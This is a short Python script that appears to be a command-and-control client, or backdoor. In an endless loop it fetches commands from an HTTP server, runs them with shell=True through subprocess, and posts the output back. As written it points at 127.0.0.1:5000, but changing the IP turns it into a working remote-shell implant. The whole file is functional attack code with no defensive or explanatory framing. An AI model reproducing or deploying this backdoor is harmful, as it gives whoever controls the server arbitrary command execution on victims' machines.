import requests
from time import sleep
import subprocess

s = requests.Session()

IP = "127.0.0.1"
PORT = "5000"

class URL:
    def __init__(self, url_post, url_get):
        self.url_post = url_post
        self.url_get = url_get

url = URL(url_post=f"http://{IP}:{PORT}/", url_get=f"http://{IP}:{PORT}/command")


def runCommands():
    command = s.get(url.url_get).json()["command"]
    if command == "slow":
        sleep(400)
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    output, error = process.communicate()
    sendResponse({"response": output.decode("latin1")})


def sendResponse(response):
    s.post(url.url_post, json=response)


while True:
    runCommands()
    sleep(7)

